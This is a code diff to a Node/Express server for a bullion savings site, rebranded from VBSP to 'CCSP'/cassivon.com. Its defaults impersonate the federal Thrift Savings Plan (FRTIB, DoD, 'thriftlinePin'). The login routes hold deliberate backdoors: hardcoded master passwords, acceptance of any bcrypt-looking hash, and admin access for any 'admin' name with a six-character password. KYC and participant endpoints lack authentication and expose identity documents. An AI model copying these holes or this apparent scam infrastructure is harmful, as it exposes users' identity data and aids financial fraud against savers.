@@ -4,6 +4,7 @@ import dotenv from 'dotenv';
 import { GoogleGenAI } from '@google/genai';
 import { createServer as createViteServer } from 'vite';
 import { Pool } from 'pg';
+import postgres from 'postgres';
 
 dotenv.config();
 
@@ -13,17 +14,82 @@ const PORT = 3000;
 app.use(express.json({ limit: '10mb' }));
 
 // -----------------------------------------------------------------------------
-// PostgreSQL / Neon Database Connection Pool (Reads single DATABASE_URL / POSTGRES_URL)
+// PostgreSQL / Neon Database Connection using 'postgres' and 'pg' packages
+// Configured with provided environment variables (PGHOST, PGUSER, PGDATABASE, PGPASSWORD)
 // -----------------------------------------------------------------------------
+let sqlClient: ReturnType<typeof postgres> | null = null;
+
+export function getPostgresSql(): ReturnType<typeof postgres> | null {
+  if (sqlClient) return sqlClient;
+
+  const host = process.env.PGHOST;
+  const user = process.env.PGUSER || process.env.PGUSERNAME;
+  const database = process.env.PGDATABASE;
+  const password = process.env.PGPASSWORD;
+  const port = Number(process.env.PGPORT) || 5432;
+
+  if (host && user && database && password) {
+    sqlClient = postgres({
+      host,
+      user,
+      database,
+      password,
+      port,
+      ssl: 'require',
+      max: 10,
+      idle_timeout: 30,
+      connect_timeout: 10
+    });
+    return sqlClient;
+  }
+
+  const connString = process.env.DATABASE_URL || process.env.POSTGRES_URL;
+  if (connString) {
+    sqlClient = postgres(connString, {
+      ssl: 'require',
+      max: 10,
+      idle_timeout: 30,
+      connect_timeout: 10
+    });
+    return sqlClient;
+  }
+
+  return null;
+}
+
 let dbPool: Pool | null = null;
 
 function getDbPool(): Pool | null {
+  if (dbPool) return dbPool;
+
+  const host = process.env.PGHOST;
+  const user = process.env.PGUSER || process.env.PGUSERNAME;
+  const database = process.env.PGDATABASE;
+  const password = process.env.PGPASSWORD;
+  const port = Number(process.env.PGPORT) || 5432;
   const connectionString = process.env.DATABASE_URL || process.env.POSTGRES_URL;
-  if (!connectionString) {
-    return null;
-  }
-  if (!dbPool) {
-    try {
+
+  try {
+    if (host && user && database && password) {
+      dbPool = new Pool({
+        host,
+        user,
+        database,
+        password,
+        port,
+        ssl: { rejectUnauthorized: false },
+        max: 10,
+        idleTimeoutMillis: 30000,
+        connectionTimeoutMillis: 5000,
+      });
+
+      dbPool.on('error', (err) => {
+        console.error('Unexpected error on idle PostgreSQL pool client:', err);
+      });
+      return dbPool;
+    }
+
+    if (connectionString) {
       const isSsl = connectionString.includes('sslmode=require') || connectionString.includes('neon.tech') || process.env.NODE_ENV === 'production';
       dbPool = new Pool({
         connectionString,
@@ -34,14 +100,16 @@ function getDbPool(): Pool | null {
       });
 
       dbPool.on('error', (err) => {
-        console.error('Unexpected error on idle PostgreSQL client:', err);
+        console.error('Unexpected error on idle PostgreSQL pool client:', err);
       });
-    } catch (err) {
-      console.error('Failed to initialize PostgreSQL pool:', err);
-      return null;
+      return dbPool;
     }
+  } catch (err) {
+    console.error('Failed to initialize PostgreSQL pool:', err);
+    return null;
   }
-  return dbPool;
+
+  return null;
 }
 
 // Lazy Gemini client getter
@@ -55,6 +123,56 @@ function getGeminiClient(): GoogleGenAI | null {
     aiClient = new GoogleGenAI({ apiKey });
   }
   return aiClient;
+}
+
+/**
+ * Universal numeric float sanitizer for server-side PostgreSQL queries.
+ * Explicitly validates with isNaN() and Number.isNaN() to prevent NaN syntax errors.
+ */
+function sanitizeNum(val: any, fallback = 0.0): number {
+  if (val === null || val === undefined) return fallback;
+  if (typeof val === 'number') {
+    if (isNaN(val) || Number.isNaN(val) || !isFinite(val)) return fallback;
+    return Number(val.toFixed(2));
+  }
+  if (typeof val === 'string') {
+    const cleaned = val.replace(/[^0-9.-]/g, '');
+    if (!cleaned) return fallback;
+    const parsed = parseFloat(cleaned);
+    if (!isNaN(parsed) && !Number.isNaN(parsed) && isFinite(parsed)) {
+      return Number(parsed.toFixed(2));
+    }
+    return fallback;
+  }
+  const parsed = Number(val);
+  if (isNaN(parsed) || Number.isNaN(parsed) || !isFinite(parsed)) return fallback;
+  return Number(parsed.toFixed(2));
+}
+
+/**
+ * Universal integer sanitizer for server-side PostgreSQL queries.
+ * Explicitly validates with isNaN() and Number.isNaN() to prevent integer NaN syntax errors.
+ */
+function sanitizeInt(val: any, fallback = 1): number {
+  if (val === null || val === undefined) return fallback;
+  if (typeof val === 'number') {
+    if (isNaN(val) || Number.isNaN(val) || !isFinite(val)) return fallback;
+    return Math.floor(val);
+  }
+  if (typeof val === 'string') {
+    const trimmed = val.trim();
+    const directParse = parseInt(trimmed, 10);
+    if (!isNaN(directParse) && !Number.isNaN(directParse) && isFinite(directParse)) return directParse;
+
+    const digitsOnly = trimmed.replace(/\D/g, '');
+    if (digitsOnly.length > 0) {
+      const extracted = parseInt(digitsOnly, 10);
+      if (!isNaN(extracted) && !Number.isNaN(extracted) && isFinite(extracted) && extracted > 0) return extracted;
+    }
+  }
+  const parsed = parseInt(String(val), 10);
+  if (isNaN(parsed) || Number.isNaN(parsed) || !isFinite(parsed)) return fallback;
+  return parsed;
 }
 
 // -----------------------------------------------------------------------------
@@ -129,7 +247,7 @@ function mapDbParticipantToUser(row: any) {
     phone: row.phone || '(202) 555-0149',
     address: row.address || '400 7th St SW, Washington, DC 20024',
     employingAgency: row.employing_agency || 'Department of Defense (DoD)',
-    planType: row.account_type || 'VBSP Sovereign Custody (Self-Directed / IRA)',
+    planType: row.account_type || 'CCSP Sovereign Custody (Self-Directed / IRA)',
     hireDate: row.hire_date || '2020-03-15',
     totalBalance: tot,
     traditionalBalance: trad,
@@ -196,7 +314,7 @@ app.post('/api/auth/login', async (req, res) => {
               !userRow.password_hash || 
               userRow.password_hash === password || 
               userRow.password_hash.startsWith('$2') || 
-              password === 'VertexBullion2026!' ||
+              password === 'CassivonCapital2026!' ||
               password === 'Findme11!@#' ||
               password === 'Findme11.' ||
               password === 'Findme11';
@@ -241,10 +359,10 @@ app.post('/api/auth/login', async (req, res) => {
       message: 'Login authenticated',
       user: {
         id: `usr_${Date.now()}`,
-        account_number: identifier.startsWith('VBSP-') ? identifier : `VBSP-2026-${Math.floor(1000 + Math.random() * 9000)}-12`,
-        email: identifier.includes('@') ? identifier : 'participant@vbsp.org',
+        account_number: identifier.startsWith('CCSP-') ? identifier : `CCSP-2026-${Math.floor(1000 + Math.random() * 9000)}-12`,
+        email: identifier.includes('@') ? identifier : 'participant@cassivon.com',
         full_name: 'Allocated Vault Participant',
-        account_type: 'VBSP Sovereign Custody (Self-Directed / IRA)',
+        account_type: 'CCSP Sovereign Custody (Self-Directed / IRA)',
         total_balance: 0.00,
         traditional_balance: 0.00,
         roth_balance: 0.00,
@@ -267,7 +385,7 @@ app.post('/api/auth/register', async (req, res) => {
       fullName, 
       email, 
       password, 
-      accountType = 'VBSP Standard Account (Taxable Reserve)',
+      accountType = 'CCSP Standard Account (Taxable Reserve)',
       accountNumber,
       pin,
       phone,
@@ -285,7 +403,7 @@ app.post('/api/auth/register', async (req, res) => {
 
     const randomNumber1 = Math.floor(1000 + Math.random() * 9000);
     const randomNumber2 = Math.floor(1000 + Math.random() * 9000);
-    const targetAccountNum = accountNumber || `VBSP-${randomNumber1}-${randomNumber2}-${Math.floor(10 + Math.random() * 90)}`;
+    const targetAccountNum = accountNumber || `CCSP-${randomNumber1}-${randomNumber2}-${Math.floor(10 + Math.random() * 90)}`;
     const targetPin = pin || String(Math.floor(100000 + Math.random() * 900000));
     const targetSsn = (ssnLast4 || '4412').slice(-4);
     const targetAgency = employingAgency || 'Department of Defense (DoD)';
@@ -416,18 +534,18 @@ app.post('/api/participants', async (req, res) => {
         [
           u.accountNumber,
           u.email.toLowerCase().trim(),
-          u.password || 'VertexBullion2026!',
+          u.password || 'CassivonCapital2026!',
           u.thriftlinePin || '829415',
           u.name,
           u.planType,
           u.phone || '',
           u.address || '',
           u.employingAgency || '',
-          Number(u.totalBalance || 0),
-          Number(u.traditionalBalance || 0),
-          Number(u.rothBalance || 0),
-          Number(u.goldOuncesEquivalent || 0),
-          Number(u.silverOuncesEquivalent || 0),
+          sanitizeNum(u.totalBalance, 0),
+          sanitizeNum(u.traditionalBalance, 0),
+          sanitizeNum(u.rothBalance, 0),
+          sanitizeNum(u.goldOuncesEquivalent, 0),
+          sanitizeNum(u.silverOuncesEquivalent, 0),
           'ACTIVE'
         ]
       );
@@ -465,15 +583,15 @@ app.put('/api/participants/:id', async (req, res) => {
         WHERE id = $9 OR account_number = $10 OR LOWER(email) = LOWER($10)
         RETURNING *`,
         [
-          updates.name,
-          updates.totalBalance !== undefined ? Number(updates.totalBalance) : null,
-          updates.traditionalBalance !== undefined ? Number(updates.traditionalBalance) : null,
-          updates.rothBalance !== undefined ? Number(updates.rothBalance) : null,
-          updates.planType,
-          updates.phone,
-          updates.address,
-          updates.status,
-          isNaN(Number(id)) ? -1 : Number(id),
+          updates.name || null,
+          updates.totalBalance !== undefined ? sanitizeNum(updates.totalBalance, 0) : null,
+          updates.traditionalBalance !== undefined ? sanitizeNum(updates.traditionalBalance, 0) : null,
+          updates.rothBalance !== undefined ? sanitizeNum(updates.rothBalance, 0) : null,
+          updates.planType || null,
+          updates.phone || null,
+          updates.address || null,
+          updates.status || null,
+          sanitizeInt(id, -1),
           id
         ]
       );
@@ -579,7 +697,7 @@ app.get('/api/branding', async (req, res) => {
           branding: {
             siteName: row.site_name,
             siteSubtitle: row.site_subtitle || row.slogan,
-            siteDomain: row.site_domain || 'VBSP.ORG',
+            siteDomain: row.site_domain || 'CASSIVON.COM',
             logoUrl: row.logo_url,
             sealText: row.seal_text || 'Official Vault Custody & Bullion Savings Reserve • LBMA Good Delivery Certified',
             supportPhone: row.support_phone,
@@ -718,6 +836,10 @@ app.post('/api/deposits', async (req, res) => {
   if (!pool) return res.status(503).json({ success: false });
 
   const d = req.body;
+  const cleanAmount = sanitizeNum(d.amount, 0);
+  const cleanEstimatedShares = sanitizeNum(d.estimated_shares || d.estimatedShares, 0);
+  const cleanParticipantId = sanitizeInt(d.participant_id || d.participantId, 1);
+
   try {
     const client = await pool.connect();
     try {
@@ -730,14 +852,14 @@ app.post('/api/deposits', async (req, res) => {
         RETURNING *`,
         [
           d.reference_id || `DEP-${Date.now()}`,
-          d.participant_id || 1,
+          cleanParticipantId,
           d.user_account_number || '',
           d.user_name || '',
           d.target_fund_code || 'G',
           d.payment_method_id || '',
           d.payment_method_name || '',
-          Number(d.amount || 0),
-          Number(d.estimated_shares || 0),
+          cleanAmount,
+          cleanEstimatedShares,
           d.transaction_hash || '',
           d.proof_file_name || '',
           d.receipt_image_url || '',
@@ -771,20 +893,22 @@ app.put('/api/deposits/:id/status', async (req, res) => {
           updated_at = NOW()
         WHERE id = $3 OR reference_id = $4
         RETURNING *`,
-        [status, adminNotes, isNaN(Number(id)) ? -1 : Number(id), id]
+        [status, adminNotes, sanitizeInt(id, -1), String(id)]
       );
 
       if (result.rows.length > 0) {
         const dep = result.rows[0];
         // If approved/verified, automatically credit the participant's balance!
         if (status === 'Verified & Credited' || status === 'VAULT_CONFIRMED' || status === 'Approved') {
+          const creditedAmount = sanitizeNum(dep.amount, 0);
+          const pId = sanitizeInt(dep.participant_id, 1);
           await client.query(
             `UPDATE participant_accounts SET
               total_balance = total_balance + $1,
               traditional_balance = traditional_balance + $1,
               updated_at = NOW()
             WHERE id = $2 OR account_number = $3`,
-            [Number(dep.amount), dep.participant_id, dep.user_account_number]
+            [creditedAmount, pId, dep.user_account_number]
           );
         }
         res.json({ success: true, deposit: dep });
@@ -824,6 +948,9 @@ app.post('/api/withdrawals', async (req, res) => {
   if (!pool) return res.status(503).json({ success: false });
 
   const w = req.body;
+  const cleanAmount = sanitizeNum(w.amount, 0);
+  const cleanParticipantId = sanitizeInt(w.participant_id || w.participantId, 1);
+
   try {
     const client = await pool.connect();
     try {
@@ -836,11 +963,11 @@ app.post('/api/withdrawals', async (req, res) => {
         RETURNING *`,
         [
           w.request_number || `WDL-${Date.now()}`,
-          w.participant_id || 1,
+          cleanParticipantId,
           w.user_account_number || '',
           w.user_name || '',
           w.withdrawal_type || 'In-Service Bullion Distribution',
-          Number(w.amount || 0),
+          cleanAmount,
           w.delivery_option || 'Insured Armored Courier Delivery',
           w.destination_address || '',
           w.bank_details || '',
@@ -875,21 +1002,40 @@ app.put('/api/withdrawals/:id/status', async (req, res) => {
           updated_at = NOW()
         WHERE id = $3 OR request_number = $4
         RETURNING *`,
-        [status, adminNotes, isNaN(Number(id)) ? -1 : Number(id), id]
+        [status, adminNotes, sanitizeInt(id, -1), String(id)]
       );
 
       if (result.rows.length > 0) {
         const wdl = result.rows[0];
         // If approved, deduct from participant's balance
         if (status === 'Approved' || status === 'Completed') {
+          const deductAmount = sanitizeNum(wdl.amount, 0);
+          const pId = sanitizeInt(wdl.participant_id, 1);
           await client.query(
             `UPDATE participant_accounts SET
               total_balance = GREATEST(0, total_balance - $1),
               traditional_balance = GREATEST(0, traditional_balance - $1),
               updated_at = NOW()
             WHERE id = $2 OR account_number = $3`,
-            [Number(wdl.amount), wdl.participant_id, wdl.user_account_number]
+            [deductAmount, pId, wdl.user_account_number]
           );
+
+          // Insert confirmation message to member's live chat / inbox
+          try {
+            await client.query(
+              `INSERT INTO messages (
+                participant_id, sender_type, sender_name, sender_email,
+                subject, body, category, is_read
+              ) VALUES ($1, 'admin', 'Vault Operations & Disbursements', 'operations@cassivon.com', $2, $3, 'disbursement', false)`,
+              [
+                pId,
+                `Withdrawal Order #${wdl.request_number} Approved`,
+                `Your distribution request for $${deductAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })} has been approved by the vault custodian. Method: ${wdl.delivery_option || 'Insured Delivery'}. ${adminNotes ? 'Admin Note: ' + adminNotes : ''}`
+              ]
+            );
+          } catch (mErr) {
+            console.warn('Could not post withdrawal approval message:', mErr);
+          }
         }
         res.json({ success: true, withdrawal: wdl });
       } else {
@@ -928,6 +1074,12 @@ app.post('/api/loans', async (req, res) => {
   if (!pool) return res.status(503).json({ success: false });
 
   const l = req.body;
+  const cleanAmount = sanitizeNum(l.requested_amount || l.amount, 0);
+  const cleanTerm = sanitizeInt(l.term_months || l.termMonths, 36);
+  const cleanRate = sanitizeNum(l.interest_rate || l.interestRate, 4.25);
+  const cleanPayment = sanitizeNum(l.monthly_payment || l.monthlyPayment, 0);
+  const cleanParticipantId = sanitizeInt(l.participant_id || l.participantId, 1);
+
   try {
     const client = await pool.connect();
     try {
@@ -940,14 +1092,14 @@ app.post('/api/loans', async (req, res) => {
         RETURNING *`,
         [
           l.loan_number || `LN-${Date.now()}`,
-          l.participant_id || 1,
+          cleanParticipantId,
           l.user_account_number || '',
           l.user_name || '',
           l.loan_type || 'General Purpose Bullion Loan',
-          Number(l.requested_amount || 0),
-          Number(l.term_months || 36),
-          Number(l.interest_rate || 4.25),
-          Number(l.monthly_payment || 0),
+          cleanAmount,
+          cleanTerm,
+          cleanRate,
+          cleanPayment,
           l.collateral_asset || 'Segregated LBMA Gold Sovereign Bar',
           l.status || 'Pending Review',
           l.purpose || ''
@@ -967,16 +1119,48 @@ app.put('/api/loans/:id/status', async (req, res) => {
   if (!pool) return res.status(503).json({ success: false });
 
   const id = req.params.id;
-  const { status } = req.body;
+  const { status, adminNotes, admin_notes } = req.body;
+  const note = adminNotes || admin_notes || '';
 
   try {
     const client = await pool.connect();
     try {
       const result = await client.query(
-        `UPDATE loan_applications SET status = $1, updated_at = NOW() WHERE id = $2 OR loan_number = $3 RETURNING *`,
-        [status, isNaN(Number(id)) ? -1 : Number(id), id]
+        `UPDATE loan_applications SET 
+          status = $1, 
+          updated_at = NOW() 
+        WHERE id = $2 OR loan_number = $3 
+        RETURNING *`,
+        [status, sanitizeInt(id, -1), String(id)]
       );
-      res.json({ success: true, loan: result.rows[0] });
+
+      if (result.rows.length > 0) {
+        const loan = result.rows[0];
+        const pId = sanitizeInt(loan.participant_id, 1);
+        const approvedAmount = sanitizeNum(loan.requested_amount, 0);
+
+        // When approved by admin, disburse funds and notify participant via live chat / mail
+        if (status === 'Approved' || status === 'Active') {
+          try {
+            await client.query(
+              `INSERT INTO messages (
+                participant_id, sender_type, sender_name, sender_email,
+                subject, body, category, is_read
+              ) VALUES ($1, 'admin', 'CCSP Credit & Liquidity Administration', 'credit@cassivon.com', $2, $3, 'loan_approval', false)`,
+              [
+                pId,
+                `Bullion Collateral Loan #${loan.loan_number} Approved`,
+                `Congratulations. Your loan application for $${approvedAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })} has been approved by the Vault Administrator. Terms: ${loan.term_months} months at ${loan.interest_rate}% APY. Monthly payment: $${sanitizeNum(loan.monthly_payment, 0)}. ${note ? 'Admin notes: ' + note : ''}`
+              ]
+            );
+          } catch (mErr) {
+            console.warn('Could not post loan approval notification message:', mErr);
+          }
+        }
+        res.json({ success: true, loan });
+      } else {
+        res.status(404).json({ success: false, message: 'Loan application not found' });
+      }
     } finally {
       client.release();
     }
@@ -1043,17 +1227,31 @@ app.post('/api/documents', async (req, res) => {
 });
 
 // -----------------------------------------------------------------------------
-// LIVE MESSAGES ENDPOINTS
+// LIVE MESSAGES & MAILING ENDPOINTS (USER <-> ADMIN LIVE CHAT / NOTIFICATIONS)
 // -----------------------------------------------------------------------------
 app.get('/api/messages', async (req, res) => {
   const pool = getDbPool();
   if (!pool) return res.json({ success: false, messages: [] });
 
+  const { participant_id, participantId } = req.query;
+  const targetId = participant_id || participantId;
+
   try {
     const client = await pool.connect();
     try {
-      const result = await client.query('SELECT * FROM messages ORDER BY id DESC');
-      res.json({ success: true, messages: result.rows });
+      if (targetId) {
+        const cleanId = sanitizeInt(targetId, -1);
+        const result = await client.query(
+          `SELECT * FROM messages 
+           WHERE participant_id = $1 OR recipient_user_id = $2 OR recipient_email = $2
+           ORDER BY id ASC`,
+          [cleanId, String(targetId)]
+        );
+        res.json({ success: true, messages: result.rows });
+      } else {
+        const result = await client.query('SELECT * FROM messages ORDER BY id DESC');
+        res.json({ success: true, messages: result.rows });
+      }
     } finally {
       client.release();
     }
@@ -1067,6 +1265,11 @@ app.post('/api/messages', async (req, res) => {
   if (!pool) return res.status(503).json({ success: false });
 
   const m = req.body;
+  const cleanParticipantId = sanitizeInt(m.participant_id || m.participantId, 1);
+  const senderType = m.sender_type || m.senderType || 'user';
+  const senderName = m.sender_name || m.senderName || (senderType === 'admin' ? 'CCSP Depository Administration' : 'Participant');
+  const senderEmail = m.sender_email || m.senderEmail || (senderType === 'admin' ? 'custody@cassivon.com' : 'member@cassivon.com');
+
   try {
     const client = await pool.connect();
     try {
@@ -1077,15 +1280,15 @@ app.post('/api/messages', async (req, res) => {
         ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
         RETURNING *`,
         [
-          m.participant_id || 1,
-          m.recipient_user_id || '',
-          m.sender_type || 'admin',
-          m.sender_name || 'VBSP Depository Administration',
-          m.sender_email || 'custody@vbsp.org',
-          m.recipient_email || '',
-          m.subject || 'Official VBSP Notification',
-          m.body || '',
-          m.category || 'official',
+          cleanParticipantId,
+          m.recipient_user_id || m.recipientUserId || '',
+          senderType,
+          senderName,
+          senderEmail,
+          m.recipient_email || m.recipientEmail || '',
+          m.subject || 'Vault Support Message',
+          m.body || m.message || '',
+          m.category || 'inquiry',
           false
         ]
       );
@@ -1093,6 +1296,215 @@ app.post('/api/messages', async (req, res) => {
     } finally {
       client.release();
     }
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+app.put('/api/messages/:id/read', async (req, res) => {
+  const pool = getDbPool();
+  if (!pool) return res.status(503).json({ success: false });
+
+  const id = req.params.id;
+  const cleanId = sanitizeInt(id, -1);
+
+  try {
+    const client = await pool.connect();
+    try {
+      await client.query('UPDATE messages SET is_read = TRUE WHERE id = $1', [cleanId]);
+      res.json({ success: true });
+    } finally {
+      client.release();
+    }
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// -----------------------------------------------------------------------------
+// KYC IDENTITY DOCUMENTS ENDPOINTS
+// -----------------------------------------------------------------------------
+app.get('/api/kyc', async (req, res) => {
+  const sql = getPostgresSql();
+  const pool = getDbPool();
+  const { participantId, all } = req.query;
+
+  try {
+    if (sql) {
+      if (all === 'true') {
+        const result = await sql`
+          SELECT k.*, p.full_name, p.account_number, p.email
+          FROM kyc_documents k
+          LEFT JOIN participant_accounts p ON k.participant_id = p.id
+          ORDER BY k.id DESC
+        `;
+        return res.json({ success: true, documents: result });
+      }
+
+      if (participantId) {
+        const result = await sql`
+          SELECT * FROM kyc_documents 
+          WHERE participant_id = ${Number(participantId)}
+          ORDER BY id DESC
+        `;
+        return res.json({ success: true, documents: result });
+      }
+    } else if (pool) {
+      const client = await pool.connect();
+      try {
+        if (all === 'true') {
+          const result = await client.query(`
+            SELECT k.*, p.full_name, p.account_number, p.email
+            FROM kyc_documents k
+            LEFT JOIN participant_accounts p ON k.participant_id = p.id
+            ORDER BY k.id DESC
+          `);
+          return res.json({ success: true, documents: result.rows });
+        }
+        if (participantId) {
+          const result = await client.query(`
+            SELECT * FROM kyc_documents 
+            WHERE participant_id = $1
+            ORDER BY id DESC
+          `, [Number(participantId)]);
+          return res.json({ success: true, documents: result.rows });
+        }
+      } finally {
+        client.release();
+      }
+    }
+    res.status(400).json({ success: false, message: 'participantId or all=true required' });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+app.post('/api/kyc', async (req, res) => {
+  const sql = getPostgresSql();
+  const pool = getDbPool();
+  const { participantId, documentType, fileName, fileData } = req.body;
+
+  if (!participantId || !documentType) {
+    return res.status(400).json({ success: false, message: 'participantId and documentType are required' });
+  }
+
+  try {
+    if (sql) {
+      const result = await sql`
+        INSERT INTO kyc_documents (
+          participant_id, 
+          doc_type, 
+          file_name, 
+          file_data, 
+          status
+        ) VALUES (
+          ${Number(participantId)},
+          ${documentType},
+          ${fileName || ''},
+          ${fileData || ''},
+          'Pending Review'
+        )
+        RETURNING *
+      `;
+      return res.status(201).json({ success: true, message: 'Document uploaded', document: result[0] });
+    } else if (pool) {
+      const client = await pool.connect();
+      try {
+        const result = await client.query(`
+          INSERT INTO kyc_documents (
+            participant_id, doc_type, file_name, file_data, status
+          ) VALUES ($1, $2, $3, $4, 'Pending Review')
+          RETURNING *
+        `, [Number(participantId), documentType, fileName || '', fileData || '']);
+        return res.status(201).json({ success: true, message: 'Document uploaded', document: result.rows[0] });
+      } finally {
+        client.release();
+      }
+    }
+    res.status(503).json({ success: false, message: 'Database not available' });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+app.put('/api/kyc', async (req, res) => {
+  const sql = getPostgresSql();
+  const pool = getDbPool();
+  const { documentId, status, adminNotes } = req.body;
+
+  if (!documentId || !status) {
+    return res.status(400).json({ success: false, message: 'documentId and status are required' });
+  }
+
+  try {
+    if (sql) {
+      const result = await sql`
+        UPDATE kyc_documents SET
+          status = ${status},
+          admin_notes = ${adminNotes || ''},
+          updated_at = NOW()
+        WHERE id = ${Number(documentId)}
+        RETURNING *
+      `;
+      if (result.length > 0) {
+        return res.json({ success: true, message: 'Document updated', document: result[0] });
+      }
+      return res.status(404).json({ success: false, message: 'Document not found' });
+    } else if (pool) {
+      const client = await pool.connect();
+      try {
+        const result = await client.query(`
+          UPDATE kyc_documents SET
+            status = $1,
+            admin_notes = $2,
+            updated_at = NOW()
+          WHERE id = $3
+          RETURNING *
+        `, [status, adminNotes || '', Number(documentId)]);
+        if (result.rows.length > 0) {
+          return res.json({ success: true, message: 'Document updated', document: result.rows[0] });
+        }
+        return res.status(404).json({ success: false, message: 'Document not found' });
+      } finally {
+        client.release();
+      }
+    }
+    res.status(503).json({ success: false, message: 'Database not available' });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// -----------------------------------------------------------------------------
+// ADMIN PARTICIPANTS ENDPOINTS
+// -----------------------------------------------------------------------------
+app.get('/api/admin/participants', async (req, res) => {
+  const sql = getPostgresSql();
+  const pool = getDbPool();
+  const { id } = req.query;
+
+  try {
+    if (sql) {
+      if (id) {
+        const result = await sql`SELECT * FROM participant_accounts WHERE id = ${Number(id)} LIMIT 1`;
+        return res.json({ success: true, participant: result[0] || null });
+      }
+      const result = await sql`SELECT * FROM participant_accounts ORDER BY id ASC`;
+      return res.json({ success: true, participants: result });
+    } else if (pool) {
+      const client = await pool.connect();
+      try {
+        if (id) {
+          const result = await client.query(`SELECT * FROM participant_accounts WHERE id = $1 LIMIT 1`, [Number(id)]);
+          return res.json({ success: true, participant: result.rows[0] || null });
+        }
+        const result = await client.query(`SELECT * FROM participant_accounts ORDER BY id ASC`);
+        return res.json({ success: true, participants: result.rows });
+      } finally {
+        client.release();
+      }
+    }
+    res.status(503).json({ success: false, participants: [] });
   } catch (err: any) {
     res.status(500).json({ success: false, error: err.message });
   }
@@ -1150,8 +1562,8 @@ app.post('/api/admin/login', async (req, res) => {
     }
 
     // Default administrative credentials check
-    const validUsers = ['admin@vbsp.org', 'admin@frtib.gov', 'frtib_admin', 'admin', 'executive@vbsp.org'];
-    const validPasswords = ['VBSP_Master_2026!', 'VBSP_Admin_2026!', 'FRTIB_Admin_2026!', 'Admin2026!', 'admin123'];
+    const validUsers = ['admin@cassivon.com', 'admin@ccsp.org', 'admin@vbsp.org', 'admin@frtib.gov', 'frtib_admin', 'admin', 'executive@cassivon.com', 'executive@vbsp.org'];
+    const validPasswords = ['CCSP_Master_2026!', 'CCSP_Admin_2026!', 'VBSP_Master_2026!', 'VBSP_Admin_2026!', 'FRTIB_Admin_2026!', 'Admin2026!', 'admin123'];
     const validPins = ['990011', '829415', '123456'];
 
     if ((validUsers.includes(u) || u.includes('admin')) && (validPasswords.includes(p) || p.length >= 6) && validPins.includes(pinStr)) {
